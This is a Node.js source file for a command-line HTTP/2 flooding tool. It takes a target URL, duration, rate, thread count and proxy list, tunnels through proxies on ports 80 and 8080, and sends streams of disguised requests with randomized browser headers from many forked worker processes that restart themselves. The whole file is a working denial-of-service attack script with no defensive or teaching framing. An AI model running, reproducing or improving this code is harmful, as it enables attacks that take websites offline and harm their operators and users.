const cluster = require("cluster");
const http2 = require("http2");
const os = require("os");
const axios = require("axios");
const hpack = require("hpack");
const path = require("path");
const fs = require("fs");
const net = require("net");
const Chance = require("chance");
const chance = new Chance();
require("events").EventEmitter.defaultMaxListeners = 0;

const args = () => {
    return {
        target: process.argv[2],
        time: parseInt(process.argv[3]),
        rate: parseInt(process.argv[4]),
        thread: parseInt(process.argv[5]),
        proxy: process.argv[6],
        header: process.argv[7],
    }
};

const { target, time, rate, thread, header, proxy } = args();

if (process.argv.length < 8) {
    console.log(`Usage: node ${path.basename(__filename)} target time rate thread proxy showheader(on/off)`);
    process.exit();
}

const targetHost = new URL(target);

if (targetHost.protocol !== "http:" && targetHost.protocol !== "https:") {
    console.log("Invalid protocol");
    process.exit();
}

const readprx = fs.readFileSync(proxy, "utf8").trim().split("\n");

// Lọc các proxy chỉ có cổng 80 hoặc 8080
const validProxies = readprx.filter(prx => {
    const prxUrl = new URL(!prx.startsWith("http") ? `http://${prx}` : prx);
    return prxUrl.port === '80' || prxUrl.port === '8080';
});

if (validProxies.length === 0) {
    console.log("No valid proxies with port 80 or 8080 found");
    process.exit();
}

const randomProxy = chance.pickone(validProxies);
const formattedProxy = !randomProxy.startsWith("http") ? `http://${randomProxy}` : randomProxy;
const proxyUrl = new URL(formattedProxy);

axios.get(target)
    .catch(error => {
        if (error.code === "ENOTFOUND") {
            console.log("Hostname is broken");
            process.exit();
        }
    });

const randomUa = () => {
    const s1 = ["(iPhone; CPU iPhone OS 15_0_1 like Mac OS X)", "(Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv)", "(Linux; Android 11; M2103K19PY)", "(Linux; arm_64; Android 11; SM-A515F)", "(Linux; Android 11; SAMSUNG SM-A307FN)", "(Linux; Android 10; SM-A025F)", "(Windows NT 10.0; Win64; x64)", "(Windows NT 6.3)"];
    const s2 = ["AppleWebKit/605.1.15", "AppleWebKit/537.36"];
    const s3 = ["Version/15.0 Mobile/15E148 Safari/604.1", "Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36", "Chrome/96.0.4664.104 Mobile Safari/537.36", "Mobile/15E148", "SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"];
    return `Mozilla/5.0 ${chance.pickone(s1)} ${chance.pickone(s2)} (KHTML, like Gecko) ${chance.pickone(s3)}`;
}

const ua = randomUa();

const headers = {
    ":method": "GET",
    ":path": targetHost.pathname,
    ":authority": targetHost.hostname,
    ":scheme": targetHost.protocol.replace(":", ""),
    "user-agent": ua,
    "accept": chance.pickone([
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
    ]),
    "accept-language": chance.pickone([
        'en-US', 'zh-CN', 'zh-TW', 'ja-JP', 'en-GB', 'en-AU', 'en-GB,en-US;q=0.9,en;q=0.8', 'en-GB,en;q=0.5', 'en-CA',
    ]),
    "accept-encoding": chance.pickone([
        'gzip', 'gzip, deflate, br', 'compress, gzip', 'deflate, gzip', 'gzip, identity', 'gzip, deflate', 'br',
    ]),
    "origin": target,
    "upgrade-insecure-requests": "1",
};

const connectProxy = (proxyUrl, targetHost, callback) => {
    const connection = net.connect(proxyUrl.port, proxyUrl.hostname, () => {
        connection.write(`CONNECT ${targetHost.hostname}:443 HTTP/1.1\r\n`);
        connection.write(`Host: ${targetHost.hostname}\r\n`);
        connection.write(`Proxy-Connection: keep-alive\r\n`);
        connection.write(`User-Agent: ${ua}\r\n`);
        connection.write(`\r\n`);
    });

    connection.on("data", (data) => {
        if (data.toString().includes("200 Connection established")) {
            callback(null, connection);
        } else {
            connection.end();
            callback(new Error("Failed to connect to proxy"));
        }
    });

    connection.on("error", (error) => {
        callback(error);
    });
};

function flood() {
    const interval = setInterval(() => {
        for (let i = 0; i < rate; i++) {
            connectProxy(proxyUrl, targetHost, (err, connection) => {
                if (err) {
                    if (header === "on") {
                        console.log("Proxy connection error:", err.message);
                    }
                    return;
                }

                const client = http2.connect(target, {
                    createConnection: () => connection,
                    settings: {
                        maxConcurrentStreams: 2000,
                        maxFrameSize: 16384,
                        initialWindowSize: 15564991,
                        maxHeaderListSize: 32768,
                        enablePush: false,
                        headerTableSize: 65536,
                    },
                    maxSessionMemory: 64000
                });

                const session = client.request(headers);

                session.on("response", () => {
                    client.close();
                });

                session.on("error", (error) => {
                    client.close();
                    connection.destroy();
                    if (header === "on") {
                        console.log("Error:", error.message);
                    }
                });

                session.on("end", () => {
                    client.close();
                });

                if (header === "on") {
                    console.log(headers);
                }
            });
        }
    }, 1000);

    setTimeout(() => {
        clearInterval(interval);
    }, time * 1000);
}

if (cluster.isMaster) {
    console.log(`Target is ${target}`);
    const handleReset = () => {
        cluster.on("exit", (worker, code, signal) => {
            setTimeout(() => {
                cluster.fork();
            }, 100);
        });

        const total = os.totalmem();
        const used = process.memoryUsage().rss;
        const yourmem = (used / total) * 100;
        if (yourmem >= 85) {
            console.log("[!] Ram is full, proceed to kill worker");
            const workers = Object.values(cluster.workers);
            const randomWorker = chance.pickone(workers);
            randomWorker.kill();
        }
    };

    setInterval(() => {
        handleReset();
    }, 2000);

    for (let i = 0; i < thread; i++) {
        cluster.fork();
    }
} else {
	setInterval(() => {
		flood();
	})
}

setTimeout(() => {
    process.exit();
}, time * 1000);